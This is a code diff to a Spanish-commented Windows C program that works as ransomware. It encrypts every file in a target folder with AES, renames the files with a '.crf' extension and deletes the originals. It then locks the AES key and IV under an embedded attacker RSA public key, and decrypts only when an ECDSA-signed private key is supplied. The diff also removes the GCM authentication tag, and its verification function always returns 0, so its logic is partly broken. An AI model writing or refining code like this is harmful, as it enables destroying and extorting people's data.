@@ -5,31 +5,164 @@
 #include <Shlwapi.h>
 #include <dirent.h>
 #include <direct.h>
+#include <openssl/ec.h>
 #include <openssl/evp.h>
 #include <openssl/rand.h>
 #include <openssl/rsa.h>
 #include <openssl/pem.h>
 #include <openssl/err.h>
+#include <openssl/bio.h>
 
-void generateRSAKeyPair(const char *privateKeyFileName, const char *publicKeyFileName) {
-    RSA *rsa = RSA_new();
-    BIGNUM *e = BN_new();
+const char *clavePublicaRSA = "-----BEGIN RSA PUBLIC KEY-----\n"
+                              "MIIBCgKCAQEAty4ltThvy3ZjbhZ/tVkXLSUZwXffEpoj+qWymwokbCnVshS1VrS1\n"
+                              "OJ8CYt0jIUPU8E9NBRvvez9PlKPpQ5EGpdJK2kriumGURM20W48SeC/8gruxw6Hg\n"
+                              "gCHw3UTIQSUfAOKGkz7E3D3rW1wUkEijrHWuRz5yVc6hfCfHyA0IXGpJTJiLPjj0\n"
+                              "U6XFhn1OCJ19DpjHn68yUb4UswkhyGS9WolYngeKWUIIXRevQ9e9QbfISVBI4gUg\n"
+                              "PEy5+fwXDoPvuMCW3inyWcPaOzAhT/DLYfvX2Xf5SFPnm695ZUEJatOIDs+VpPH9\nntuXAsVNwjo/f8HQ8rtk32KFfxvpv+FHBwIDAQAB\n"
+                              "-----END RSA PUBLIC KEY-----";
+const char *clavePublicaFirma = "-----BEGIN PUBLIC KEY-----\n"
+                                "MFYwEAYHKoZIzj0CAQYFK4EEAAoDQgAEazNs8zbRN8SMetU61wxckxuwnxJXd6Kb\n"
+                                "XoE6bafsYC5gK1DpwqCbf3lD4h/1W1O65RFQua4EF4iqO4uKNq8w/g==\n"
+                                "-----END PUBLIC KEY-----";
 
-    if (rsa && e) {
-        if (BN_set_word(e, RSA_F4) && RSA_generate_key_ex(rsa, 2048, e, NULL)) {
-            FILE *privateKeyFile = fopen(privateKeyFileName, "wb");
-            FILE *publicKeyFile = fopen(publicKeyFileName, "wb");
-            if (privateKeyFile) {
-                PEM_write_RSAPrivateKey(privateKeyFile, rsa, NULL, NULL, 0, NULL, NULL);
-                PEM_write_RSAPublicKey(publicKeyFile, rsa);
-                fclose(publicKeyFile);
-                fclose(privateKeyFile);
-            }
-        }
-
-        BN_free(e);
-        RSA_free(rsa);
+int verifyWithECDSA(const char *signedFile, const char *ecdsaPublicKeyPEM) {
+    // Cargar la firma desde el archivo
+    FILE *signedFilePtr = fopen(signedFile, "rb");
+    if (!signedFilePtr) {
+        perror("Error al abrir el archivo con la firma");
+        return 0;
     }
+
+    fseek(signedFilePtr, 0, SEEK_END);
+    long signedFileSize = ftell(signedFilePtr);
+    fseek(signedFilePtr, 0, SEEK_SET);
+
+    char *signedData = (char *)malloc(signedFileSize + 1);
+    if (!signedData) {
+        perror("Error de asignación de memoria para la firma");
+        fclose(signedFilePtr);
+        return 0;
+    }
+
+    fread(signedData, 1, signedFileSize, signedFilePtr);
+    fclose(signedFilePtr);
+
+    signedData[signedFileSize] = '\0';
+
+    // Encontrar la posición de inicio y fin de la firma
+    const char *beginDelimiter = "-----BEGIN ECDSA SIGNATURE-----";
+    const char *endDelimiter = "-----END ECDSA SIGNATURE-----";
+    const char *begin = strstr(signedData, beginDelimiter);
+    const char *end = strstr(signedData, endDelimiter);
+
+    if (!begin || !end) {
+        perror("Delimitadores de firma no encontrados");
+        free(signedData);
+        return 0;
+    }
+
+    // Calcular la longitud de la firma sin incluir los delimitadores
+    size_t signatureLen = end - begin - strlen(beginDelimiter);
+
+    // Crear un buffer para la firma y copiar la firma sin incluir los delimitadores
+    unsigned char *signature = (unsigned char *)malloc(signatureLen);
+    if (!signature) {
+        perror("Error de asignación de memoria para la firma");
+        free(signedData);
+        return 0;
+    }
+
+    memcpy(signature, begin + strlen(beginDelimiter), signatureLen);
+
+    // Cargar la clave pública ECDSA desde la constante global
+    BIO *ecdsaBio = BIO_new_mem_buf((void *)ecdsaPublicKeyPEM, -1);
+    if (!ecdsaBio) {
+        perror("Error al crear el objeto BIO para la clave pública ECDSA");
+        free(signedData);
+        free(signature);
+        return 0;
+    }
+
+    // Crear la clave ECDSA y asignarla a un objeto EVP_PKEY
+    EC_KEY *ecdsaKey = PEM_read_bio_EC_PUBKEY(ecdsaBio, NULL, NULL, NULL);
+    BIO_free(ecdsaBio);
+    if (!ecdsaKey) {
+        perror("Error al leer la clave pública ECDSA");
+        free(signedData);
+        free(signature);
+        return 0;
+    }
+
+    EVP_PKEY *pkey = EVP_PKEY_new();
+    EVP_PKEY_assign_EC_KEY(pkey, ecdsaKey);
+
+    // Crear el contexto de verificación ECDSA
+    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
+    if (!mdctx) {
+        perror("Error al crear el contexto de verificación");
+        free(signedData);
+        free(signature);
+        EVP_PKEY_free(pkey);
+        return 0;
+    }
+
+    // Inicializar la verificación ECDSA con el objeto EVP_PKEY
+    if (EVP_DigestVerifyInit(mdctx, NULL, EVP_sha256(), NULL, pkey) != 1) {
+        perror("Error al inicializar la verificación ECDSA");
+        free(signedData);
+        free(signature);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    // Actualizar la verificación con los datos de la firma
+    if (EVP_DigestVerifyUpdate(mdctx, (const unsigned char *)signedData, begin - signedData) != 1) {
+        perror("Error al actualizar la verificación con los datos de la firma");
+        free(signedData);
+        free(signature);
+        EVP_PKEY_free(pkey);
+        EVP_MD_CTX_free(mdctx);
+        return 0;
+    }
+
+    // Verificar la firma
+    int verificationResult = EVP_DigestVerifyFinal(mdctx, signature, signatureLen);
+
+    // Imprimir el resultado de la verificación
+    if (verificationResult == 1) {
+        printf("La firma es válida.\n");
+    } else {
+        printf("La firma no es válida.\n");
+    }
+
+    // Liberar la memoria y recursos
+    free(signedData);
+    free(signature);
+    EVP_PKEY_free(pkey);
+    EVP_MD_CTX_free(mdctx);
+
+    return 0;
+}
+
+RSA *parseRSAPublicKeyFromPEMString(const char *pemKey) {
+    BIO *bio = BIO_new_mem_buf((void *)pemKey, -1);  // -1 para que BIO determine la longitud automáticamente
+
+    if (bio == NULL) {
+        // Manejar el error
+        return NULL;
+    }
+
+    RSA *rsa = PEM_read_bio_RSAPublicKey(bio, NULL, NULL, NULL);
+
+    if (rsa == NULL) {
+        // Manejar el error
+        BIO_free(bio);
+        return NULL;
+    }
+
+    BIO_free(bio);
+    return rsa;
 }
 
 void encryptWithPublicKey(const char* inputFileName, const char* outputFileName, RSA* publicKey) {
@@ -144,6 +277,7 @@ int main()
 
     // Definir la ruta completa al archivo del IV
     const char *ivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt"; 
+    const char *EncivFileName = "C:\\Users\\usuario\\Desktop\\IV.txt.enc"; 
 
     // Definimos la carpeta a encriptar//
     const char *Target = "C:\\Users\\usuario\\Desktop\\Objetivo";
@@ -155,15 +289,13 @@ int main()
     struct dirent *File;
 
     // claves RSA //
-    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\ClavePrivada.pem";
-    const char *PublicKey = "C:\\Users\\usuario\\Desktop\\ClavePublica.pem";
+    const char *PrivateKey = "C:\\Users\\usuario\\Desktop\\signed_rsa_with_ecdsa.pem";
 
     if ((File = readdir(Victim)) != NULL){
     int Envirao = mkdir(Encriptado);
     int Secreto = mkdir(Clave);
     generateRandomKey(key, sizeof(key));
     generateRandomIV(iv, sizeof(iv));
-    generateRSAKeyPair(PrivateKey,PublicKey);
 
     // Lectura de los archivos del fichero //
     while ((File = readdir(Victim)) != NULL)
@@ -176,12 +308,12 @@ int main()
 
             // Comprobamos si está encriptado o no el archivo //
             // ENCRIPTAMOS //
-            if(_stricmp(extension, ".cifrado") != 0){
+            if(_stricmp(extension, ".crf") != 0){
                 char inputFileName[1024];
                 PathCombineA(inputFileName, Target, File->d_name);
                 printf("Ruta del archivo: %s\n", inputFileName);
                 FILE *inputFile = fopen(inputFileName, "rb");
-                const char *enc = ".cifrado";
+                const char *enc = ".crf";
                 char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                 strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                 strcat(PathCombineA(outputFileName, Encriptado, File->d_name), enc); // Concatenar la extensión ".enc"
@@ -209,13 +341,6 @@ int main()
                     EVP_EncryptFinal_ex(ctx, outBuf, &bytesWritten);
                     fwrite(outBuf, 1, bytesWritten, outputFile);
 
-                    // Obtiene la etiqueta de autenticación
-                    unsigned char tag[16];
-                    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, sizeof(tag), tag);
-
-                    // Escribe la etiqueta de autenticación en el archivo de salida
-                    fwrite(tag, 1, sizeof(tag), outputFile);
-                    
                     if (inputFile != NULL) {
                         fclose(inputFile);
                     }
@@ -227,13 +352,11 @@ int main()
                     saveIVToFile(ivFileName,iv,sizeof(iv));
                     saveKeyToFile(keyFileName,key,sizeof(key));
 
-                    FILE* publicKeyFile = fopen(PublicKey, "rb");
-                    RSA* clavePublica = PEM_read_RSAPublicKey(publicKeyFile, NULL, NULL, NULL);
-                    fclose(publicKeyFile);
-                    encryptWithPublicKey(keyFileName,EnckeyFileName,clavePublica);
-                    RSA_free(clavePublica);
+                    RSA *rsa = parseRSAPublicKeyFromPEMString(clavePublicaRSA);
+                    encryptWithPublicKey(keyFileName,EnckeyFileName,rsa);
+                    encryptWithPublicKey(ivFileName,EncivFileName,rsa);
+                    RSA_free(rsa);
                     
-
                     remove(inputFileName);
                     rmdir(Target);
 
@@ -243,12 +366,13 @@ int main()
             }
         } 
     }
-    remove(PublicKey);
     }else {
-        FILE *privateKeyFile = fopen(PrivateKey, "rb");
-        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFile, NULL, NULL, NULL);
-        fclose(privateKeyFile);
-        decryptWithPrivateKey(EnckeyFileName,keyFileName,clavePrivada);
+        if (verifyWithECDSA(PrivateKey, clavePublicaFirma)) {
+        FILE *privateKeyFileSigned = fopen(PrivateKey, "rb");
+        RSA *clavePrivada = PEM_read_RSAPrivateKey(privateKeyFileSigned, NULL, NULL, NULL);
+        fclose(privateKeyFileSigned);
+        decryptWithPrivateKey(EnckeyFileName, keyFileName, clavePrivada);
+        decryptWithPrivateKey(EncivFileName, ivFileName, clavePrivada);
         RSA_free(clavePrivada);
         
 
@@ -261,8 +385,8 @@ int main()
 
             // Comprobamos si está encriptado o no el archivo //
             // Desencriptamos //
-            if(_stricmp(extension, ".cifrado") == 0){
-                printf("La extensión es .cifrado \n");
+            if(_stricmp(extension, ".crf") == 0){
+                printf("La extensión es .crf \n");
                 // Lee la clave y la extrae//
                 FILE *keyFile = fopen(keyFileName, "rb");
                 fread(key, 1, sizeof(key), keyFile);
@@ -277,7 +401,7 @@ int main()
                 char inputFileName[1024];
                 PathCombineA(inputFileName, Encriptado, File->d_name);
                 FILE *inputFile = fopen(inputFileName, "rb");
-                const char *enc = ".cifrado";
+                const char *enc = ".crf";
                 char outputFileName[1024]; // Declarar un búfer para el nombre de archivo de salida
                 strcpy(outputFileName, File->d_name); // Copiar el nombre del archivo original
                 char *encPtr = strstr(PathCombineA(outputFileName,Target,File->d_name), enc);
@@ -325,16 +449,20 @@ int main()
                     }
                     remove(inputFileName);
                     
-            }
-        }
+                }
+                }
 
-    }
+            }
             }
         }
         rmdir(Encriptado);
         remove(keyFileName);
         remove(ivFileName);
         remove(PrivateKey);
+        } else {
+            printf("Firma incorrecta");
+        }
+
     }
     return 0;
 
